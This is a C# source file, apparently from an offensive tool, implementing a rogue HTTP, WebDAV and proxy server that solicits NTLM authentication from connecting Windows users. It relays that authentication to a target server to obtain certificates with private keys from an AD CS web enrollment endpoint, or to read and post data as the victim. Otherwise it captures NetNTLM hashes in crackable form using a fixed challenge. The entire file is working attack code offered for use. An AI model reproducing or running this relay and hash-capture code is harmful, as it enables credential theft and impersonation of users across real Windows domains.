using System;
using System.Text;
using System.Web;
using System.Net.Http;
using System.Net;
using System.Linq;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text.RegularExpressions;
using System.Collections.Generic;

namespace Combine
{
	/// <summary>
	/// Summary description for MyServer.
	/// </summary>
	public class HttpRelayServer : HttpServer 
	{
		public List<string> usersAttacked;
		private System.Net.Http.HttpClient client;

        public HttpRelayServer() : base()
		{
            client = new System.Net.Http.HttpClient();
			usersAttacked = new List<string>();
		}
		
		public override void OnResponse(ref HTTPRequestStruct rq, ref HTTPResponseStruct rp)
		{

            switch (rq.Method.ToString().ToUpper())
            {
				case "OPTIONS":
					Options(ref rp);
					break;

				case "GET":
					Get(ref rq, ref rp, false);
					break;

				case "PROPFIND":
					Propfind(ref rq, ref rp);
					break;

				case "HEAD":
					Head(ref rp);
					break;

				case "CONNECT":
					Get(ref rq, ref rp, true);
					break;

			}		
		}

		public static string PemEncodeSigningRequest(CertificateRequest request)
		{
			byte[] pkcs10 = request.CreateSigningRequest();
			StringBuilder builder = new StringBuilder();

			builder.AppendLine("-----BEGIN CERTIFICATE REQUEST-----");

			string base64 = Convert.ToBase64String(pkcs10);

			int offset = 0;
			const int LineLength = 64;

			while (offset < base64.Length)
			{
				int lineEnd = Math.Min(offset + LineLength, base64.Length);
				builder.AppendLine(base64.Substring(offset, lineEnd - offset));
				offset = lineEnd;
			}

			builder.AppendLine("-----END CERTIFICATE REQUEST-----");
			return builder.ToString();
		}

		public void Get(ref HTTPRequestStruct rq, ref HTTPResponseStruct rp, bool proxy)
        {
			if ((rq.Headers.ContainsKey("Authorization") == false) && (rq.Headers.ContainsKey("Proxy-Authorization") == false))
			{
				RequestAuth(ref rq, ref rp, proxy);
				return;
			}
			else
			{
				string blob = string.Empty;

				if (proxy)
					blob = rq.Headers["Proxy-Authorization"].ToString().Split(' ')[1].Trim();
				else
					blob = rq.Headers["Authorization"].ToString().Split(' ')[1].Trim();

				if (blob == String.Empty)
                {
					RequestAuth(ref rq, ref rp, proxy);
					return;
				}					

				byte[] NTLMHash = Convert.FromBase64String(blob);
				if (NTLMHash[8] == 1)
				{
					string challenge;

					if (Config.attack > 0)
						challenge = GetChallenge(NTLMHash, Config.targetserver);
					else
						challenge = "TlRMTVNTUAACAAAABgAGADgAAAAFAomiESIzRFVmd4gAAAAAAAAAAIAAgAA+AAAABQLODgAAAA9TAE0AQgACAAYAUwBNAEIAAQAWAFMATQBCAC0AVABPAE8ATABLAEkAVAAEABIAcwBtAGIALgBsAG8AYwBhAGwAAwAoAHMAZQByAHYAZQByADIAMAAwADMALgBzAG0AYgAuAGwAbwBjAGEAbAAFABIAcwBtAGIALgBsAG8AYwBhAGwAAAAAAA==";

					if (challenge == String.Empty)
						return;

                    if (proxy)
                    {
						rp.status = (int)HttpStatusCode.ProxyAuthenticationRequired;
						rp.Headers.Add("Proxy-Authenticate", String.Format("NTLM {0}", challenge));
					}
                    else
                    {
						rp.status = (int)HttpStatusCode.Unauthorized;
						rp.Headers.Add("WWW-Authenticate", String.Format("NTLM {0}", challenge));
					}
					
					return;
				}
				else if (NTLMHash[8] == 3)
				{
					int User_len = BitConverter.ToInt16(NTLMHash, 36);
					int User_offset = BitConverter.ToInt16(NTLMHash, 40);
					byte[] User = NTLMHash.Skip(User_offset).Take(User_len).ToArray();
					string UserString = Encoding.Unicode.GetString(User);

					if(Config.targetusers.Count() > 0)
                    {
						foreach(string user in Config.targetusers)
                        {
							if (!String.Equals(UserString.ToLower(), user.ToLower()))
								return;

                        }
                    }

					if (usersAttacked.Contains(UserString.ToLower()))
						return;

					if (UserString == null || UserString == String.Empty)
                    {
						RequestAuth(ref rq, ref rp, proxy);
						return;
					}						

					switch(Config.attack)
                    {
						case 1:
							RequestCertificate(NTLMHash, UserString, Config.template);
							break;
						case 2:
							GetData(NTLMHash, Config.targetserver);
							break;
						case 3:
							PostData(NTLMHash, Config.targetserver, Config.postdata, Config.contenttype);
							break;
						default:
							DecodeNTLM(NTLMHash);
							break;
					}				
				}
				else
				{
					return;
				}
			}
		}

		private void Propfind(ref HTTPRequestStruct rq, ref HTTPResponseStruct rp)
		{

			bool proxy = false;
			if (!rq.Headers.ContainsKey("Authorization"))
			{
				RequestAuth(ref rq, ref rp, proxy);
				return;
			}
			else
			{
				string blob = rq.Headers["Authorization"].ToString().Split(' ')[1].Trim();
				byte[] NTLMHash = Convert.FromBase64String(blob);
				
				if (NTLMHash[8] == 1)
				{
					string challenge;
					if (Config.attack > 0)
						challenge = GetChallenge(NTLMHash, Config.targetserver);
					else
						challenge = "TlRMTVNTUAACAAAABgAGADgAAAAFAomiESIzRFVmd4gAAAAAAAAAAIAAgAA+AAAABQLODgAAAA9TAE0AQgACAAYAUwBNAEIAAQAWAFMATQBCAC0AVABPAE8ATABLAEkAVAAEABIAcwBtAGIALgBsAG8AYwBhAGwAAwAoAHMAZQByAHYAZQByADIAMAAwADMALgBzAG0AYgAuAGwAbwBjAGEAbAAFABIAcwBtAGIALgBsAG8AYwBhAGwAAAAAAA==";

					if (challenge == String.Empty)
						return;

					rp.status = (int)HttpStatusCode.Unauthorized;
					rp.Headers.Add("WWW-Authenticate", String.Format("NTLM {0}", challenge));
					rp.Headers.Add("Connection", "Close");
				}
				else if (NTLMHash[8] == 3)
				{
					int User_len = BitConverter.ToInt16(NTLMHash, 36);
					int User_offset = BitConverter.ToInt16(NTLMHash, 40);
					byte[] User = NTLMHash.Skip(User_offset).Take(User_len).ToArray();
					string UserString = Encoding.Unicode.GetString(User);

					if (Config.targetusers.Count() > 0)
					{
						foreach (string user in Config.targetusers)
						{
							if (!String.Equals(UserString.ToLower(), user.ToLower()))
								return;

						}
					}

					if (UserString == null || UserString == String.Empty)
					{
						RequestAuth(ref rq, ref rp, proxy);
						return;
					}

					if (usersAttacked.Contains(UserString))
						return;

					if (rq.URL.ToUpper().Contains(".JPG"))
					{
						rp.BodyData = Encoding.UTF8.GetBytes($"<?xml version=\"1.0\"?><D:multistatus xmlns:D=\"DAV: \"><D:response><D:href>http://{Environment.MachineName}:{Config.port}/file/image.JPG/</D:href><D:propstat><D:prop><D:creationdate>2016-11-12T22:00:22Z</D:creationdate><D:displayname>image.JPG</D:displayname><D:getcontentlength>4456</D:getcontentlength><D:getcontenttype>image/jpeg</D:getcontenttype><D:getetag>4ebabfcee4364434dacb043986abfffe</D:getetag><D:getlastmodified>Mon, 20 Mar 2017 00:00:22 GMT</D:getlastmodified><D:resourcetype></D:resourcetype><D:supportedlock></D:supportedlock><D:ishidden>0</D:ishidden></D:prop><D:status>HTTP/1.1 200 OK</D:status></D:propstat></D:response></D:multistatus>");
						rp.BodySize = rp.BodyData.Length;
					}
					else
					{
						rp.BodyData = Encoding.UTF8.GetBytes($"<?xml version=\"1.0\"?><D:multistatus xmlns:D=\"DAV: \"><D:response><D:href>http://{Environment.MachineName}:{Config.port}/file/</D:href><D:propstat><D:prop><D:creationdate>2016-11-12T22:00:22Z</D:creationdate><D:displayname>a</D:displayname><D:getcontentlength></D:getcontentlength><D:getcontenttype></D:getcontenttype><D:getetag></D:getetag><D:getlastmodified>Mon, 20 Mar 2017 00:00:22 GMT</D:getlastmodified><D:resourcetype><D:collection></D:collection></D:resourcetype><D:supportedlock></D:supportedlock><D:ishidden>0</D:ishidden></D:prop><D:status>HTTP/1.1 200 OK</D:status></D:propstat></D:response></D:multistatus>");
						rp.BodySize = rp.BodyData.Length;
					}


					switch (Config.attack)
					{
						case 1:
							RequestCertificate(NTLMHash, UserString, Config.template);
							break;
						case 2:
							GetData(NTLMHash, Config.targetserver);
							break;
						case 3:
							PostData(NTLMHash, Config.targetserver, Config.postdata, Config.contenttype);
							break;
						default:
							DecodeNTLM(NTLMHash);
							break;
					}
				}
			}
		}

		private string GetChallenge(byte[] NTLMHash, string uri)
        {
			var httpReq = new HttpRequestMessage();
			httpReq.Method = HttpMethod.Get;

			if(Config.attack == 3)
            {
				httpReq.Method = HttpMethod.Post;
				httpReq.Content = new StringContent(Config.postdata);
            }

			if (Config.attack == 1)
            {
				uri = uri + "/certsrv/certfnsh.asp";

			}

			httpReq.RequestUri = new Uri(uri);

			httpReq.Headers.Add("Connection", "Keep-alive");
			httpReq.Headers.Add("Authorization", String.Format("Negotiate {0}", System.Convert.ToBase64String(NTLMHash)));

			var response = client.SendAsync(httpReq);
			response.Wait();
			
            try
            {
				string result = response.Result.Headers.WwwAuthenticate.ToString().Split(' ')[1].Trim();
				return result;

			}catch(IndexOutOfRangeException)
            {
				WriteLog(String.Format("Unable to obtain challenge from {0}", Config.targetserver));
				return String.Empty;
			}
					
		}

		private static string RandomString(int length)
		{
			Random random = new Random();
			const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
			return new string(Enumerable.Repeat(chars, length)
				.Select(s => s[random.Next(s.Length)]).ToArray());
		}

		private void Redirect(ref HTTPResponseStruct rp)
        {
			string location = RandomString(10);
			rp.status = (int)HttpStatusCode.Redirect;
			rp.Headers.Add("Content-type", "text/html");
			rp.Headers.Add("WWW-Authenticate", "NTLM");
			rp.Headers.Add("Connection", "close");
			rp.Headers.Add("Location", String.Format("/{0}",location));
			return;
		}

		private void Options(ref HTTPResponseStruct rp)
		{
			rp.Headers.Add("Allow", "GET, HEAD, POST, PUT, DELETE, OPTIONS, PROPFIND, PROPPATCH, MKCOL, LOCK, UNLOCK, MOVE, COPY");
			rp.Headers.Add("Connection", "close");		
			return;
		}

		private void Head(ref HTTPResponseStruct rp)
		{
			rp.Headers.Add("Content-type", "text/html");
			return;
		}

		private void RequestAuth(ref HTTPRequestStruct rq, ref HTTPResponseStruct rp, bool proxy)
        {
            if (proxy)
            {
				rp.status = (int)HttpStatusCode.ProxyAuthenticationRequired;
				rp.Headers.Add("Proxy-Authenticate", "NTLM");
				rp.Headers.Add("Connection", "close");
			}
            else
            {
				rp.status = (int)HttpStatusCode.Unauthorized;
				rp.Headers.Add("WWW-Authenticate", "NTLM");
				rp.Headers.Add("Connection", "close");
			}
        }		

		private void RequestCertificate(byte[] NTLMHash, string targetusername, string template)
        {
			var httpReq = new HttpRequestMessage
			{
				Method = HttpMethod.Get,
				RequestUri = new Uri(String.Format("{0}/certsrv/certfnsh.asp", Config.targetserver)),
			};

			httpReq.Headers.Add("Connection", "Keep-alive");
			httpReq.Headers.Add("Authorization", String.Format("Negotiate {0}", System.Convert.ToBase64String(NTLMHash)));

			var response = client.SendAsync(httpReq);
			response.Wait();
			if (response.Result.StatusCode == HttpStatusCode.OK)
			{
				//generate an RSA key
				RSA rsa = RSA.Create(4096);

				//generate a csr
				X500DistinguishedName distinguishedName = new X500DistinguishedName(String.Format("CN={0}",targetusername));
				var request = new CertificateRequest(distinguishedName, rsa, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);

				//ask for signing
				string csrpem = PemEncodeSigningRequest(request);
				
				httpReq = new HttpRequestMessage
				{
					Method = HttpMethod.Post,
					RequestUri = new Uri(String.Format("{0}/certsrv/certfnsh.asp", Config.targetserver)),
				};
				httpReq.Content = new StringContent(String.Format("Mode=newreq&CertRequest={0}&CertAttrib=CertificateTemplate:{1}&TargetStoreFlags=0&SaveCert=yes&ThumbPrint=", HttpUtility.UrlEncode(csrpem), HttpUtility.UrlEncode(template)), Encoding.UTF8, "application/x-www-form-urlencoded");

				response = client.SendAsync(httpReq);
				response.Wait();

				var regex = new Regex("certnew\\.cer\\?ReqID=([0-9]+)&");
				var m = regex.Match(response.Result.Content.ReadAsStringAsync().Result);

				// get the cert!
				httpReq = new HttpRequestMessage
				{
					Method = HttpMethod.Get,
					RequestUri = new Uri(String.Format("{0}/certsrv/certnew.cer?ReqID={1}", Config.targetserver, m.Groups[1])),
				};

				response = client.SendAsync(httpReq);
				response.Wait();

				string certificate = response.Result.Content.ReadAsStringAsync().Result;
				if(certificate.StartsWith("-----BEGIN CERTIFICATE") == false)
                {
					WriteLog(String.Format("Failed to get {0} certificate for {1}", template, targetusername));
					return;
                }


				X509Certificate2 pubOnly = new X509Certificate2(Encoding.UTF8.GetBytes(certificate));
				X509Certificate2 pubPrivEphemeral = pubOnly.CopyWithPrivateKey(rsa);
				//X509Certificate2 pfx = new X509Certificate2(pubPrivEphemeral.Export(X509ContentType.Pfx), String.Empty, X509KeyStorageFlags.Exportable);
				WriteLog(String.Format("Got {0} certificate for {1} !", template, targetusername));
				WriteLog(String.Format("\n{0}\n",Convert.ToBase64String(pubPrivEphemeral.Export(X509ContentType.Pkcs12))));
				usersAttacked.Add(targetusername.ToLower());
			}

			return;
		}

		private void GetData(byte[] NTLMHash, string uri)
		{
			var httpReq = new HttpRequestMessage
			{
				Method = HttpMethod.Get,
				RequestUri = new Uri(String.Format("{0}", uri)),
			};

			httpReq.Headers.Add("Connection", "Keep-alive");
			httpReq.Headers.Add("Authorization", String.Format("Negotiate {0}", Convert.ToBase64String(NTLMHash)));

			var response = client.SendAsync(httpReq);
			response.Wait();
			if (response.Result.StatusCode == HttpStatusCode.OK)
			{
				WriteLog(response.Result.Content.ReadAsStringAsync().Result);
			}

			var User_len = BitConverter.ToInt16(NTLMHash, 36);
			var User_offset = BitConverter.ToInt16(NTLMHash, 40);
			var User = NTLMHash.Skip(User_offset).Take(User_len).ToArray();
			var UserString = System.Text.Encoding.Unicode.GetString(User);
			usersAttacked.Add(UserString.ToLower());
			return;
		}

		private void PostData(byte[] NTLMHash, string uri, string data, string contenttype)
		{
			var httpReq = new HttpRequestMessage
			{
				Method = HttpMethod.Post,
				RequestUri = new Uri(String.Format("{0}", uri)),
				Content = new StringContent(data, Encoding.UTF8, contenttype),
			};
						
			httpReq.Headers.Add("Connection", "Keep-alive");
			httpReq.Headers.Add("Authorization", String.Format("Negotiate {0}", Convert.ToBase64String(NTLMHash)));

			var response = client.SendAsync(httpReq);
			response.Wait();
			if (response.Result.StatusCode == HttpStatusCode.OK)
			{
				WriteLog(response.Result.Content.ReadAsStringAsync().Result);
			}

			var User_len = BitConverter.ToInt16(NTLMHash, 36);
			var User_offset = BitConverter.ToInt16(NTLMHash, 40);
			var User = NTLMHash.Skip(User_offset).Take(User_len).ToArray();
			var UserString = System.Text.Encoding.Unicode.GetString(User);
			usersAttacked.Add(UserString.ToLower());
			return;
		}

		private void DecodeNTLM(byte[] NTLMHash)
		{
			var LMHash_len = BitConverter.ToInt16(NTLMHash, 12);
			var LMHash_offset = BitConverter.ToInt16(NTLMHash, 16);
			var LMHash = NTLMHash.Skip(LMHash_offset).Take(LMHash_len).ToArray();
			var NTHash_len = BitConverter.ToInt16(NTLMHash, 20);
			var NTHash_offset = BitConverter.ToInt16(NTLMHash, 24);
			var NTHash = NTLMHash.Skip(NTHash_offset).Take(NTHash_len).ToArray();
			var User_len = BitConverter.ToInt16(NTLMHash, 36);
			var User_offset = BitConverter.ToInt16(NTLMHash, 40);
			var User = NTLMHash.Skip(User_offset).Take(User_len).ToArray();
			var UserString = System.Text.Encoding.Unicode.GetString(User);

			if (NTHash_len == 24)
			{  // NTLMv1
				var HostName_len = BitConverter.ToInt16(NTLMHash, 46);
				var HostName_offset = BitConverter.ToInt16(NTLMHash, 48);
				var HostName = NTLMHash.Skip(HostName_offset).Take(HostName_len).ToArray();
				var HostNameString = System.Text.Encoding.Unicode.GetString(HostName);
				var retval = UserString + "::" + HostNameString + ":" + LMHash + ":" + NTHash + ":1122334455667788";
				WriteLog(retval);
				usersAttacked.Add(UserString.ToLower());
				return;
			}
			else if (NTHash_len > 24)
			{ // NTLMv2
				NTHash_len = 64;
				var Domain_len = BitConverter.ToInt16(NTLMHash, 28);
				var Domain_offset = BitConverter.ToInt16(NTLMHash, 32);
				var Domain = NTLMHash.Skip(Domain_offset).Take(Domain_len).ToArray();
				var DomainString = System.Text.Encoding.Unicode.GetString(Domain);
				var HostName_len = BitConverter.ToInt16(NTLMHash, 44);
				var HostName_offset = BitConverter.ToInt16(NTLMHash, 48);
				var HostName = NTLMHash.Skip(HostName_offset).Take(HostName_len).ToArray();
				var HostNameString = System.Text.Encoding.Unicode.GetString(HostName);

				var NTHash_part1 = System.BitConverter.ToString(NTHash.Take(16).ToArray()).Replace("-", "");
				var NTHash_part2 = BitConverter.ToString(NTHash.Skip(16).Take(NTLMHash.Length).ToArray()).Replace("-", "");
				var retval = UserString + "::" + DomainString + ":1122334455667788:" + NTHash_part1 + ":" + NTHash_part2;
				WriteLog(retval);
				usersAttacked.Add(UserString.ToLower());
				return;
			}

			WriteLog("Could not parse NTLM hash");
		}
	}
}
